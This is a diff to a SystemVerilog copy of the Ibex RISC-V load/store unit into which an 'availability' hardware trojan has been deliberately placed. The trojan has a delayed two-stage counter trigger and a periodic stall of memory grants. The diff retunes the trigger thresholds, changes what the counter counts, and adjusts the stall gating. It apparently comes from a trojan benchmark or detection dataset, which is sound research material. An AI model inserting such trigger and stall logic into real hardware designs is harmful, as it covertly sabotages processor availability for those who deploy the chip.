@@ -71,13 +71,12 @@ module ibex_load_store_unit_trojan_Availability #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10610, act=5305)
     // ============================================================
-    localparam int ARM_THRESHOLD = 10315;
-    localparam int ACTIVATE_DELAY = 5157;
+    localparam int ARM_THRESHOLD   = 10610;
+    localparam int ACTIVATE_DELAY  = 5305;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -85,12 +84,15 @@ module ibex_load_store_unit_trojan_Availability #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && data_req_o) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && data_req_o) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
 
 
   logic [31:0]  data_addr;
@@ -414,7 +416,7 @@ module ibex_load_store_unit_trojan_Availability #(
           perf_load_o  = ~lsu_we_i;
           perf_store_o = lsu_we_i;
 
-          if (data_gnt_i && !stall_active) begin
+          if (data_gnt_i) begin
             ctrl_update         = 1'b1;
             addr_update         = 1'b1;
             handle_misaligned_d = split_misaligned_access;
@@ -461,7 +463,7 @@ module ibex_load_store_unit_trojan_Availability #(
           handle_misaligned_d = ~data_gnt_i;
         end else begin
           // first part rvalid is NOT received
-          if (data_gnt_i && !stall_active) begin
+          if (data_gnt_i) begin
             // second grant is received
             ls_fsm_ns = WAIT_RVALID_MIS_GNTS_DONE;
             handle_misaligned_d = 1'b0;
@@ -645,12 +647,9 @@ module ibex_load_store_unit_trojan_Availability #(
   `ASSERT(IbexDataAddrUnaligned, data_req_o |-> (data_addr_o[1:0] == 2'b00))
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -664,5 +663,6 @@ module ibex_load_store_unit_trojan_Availability #(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
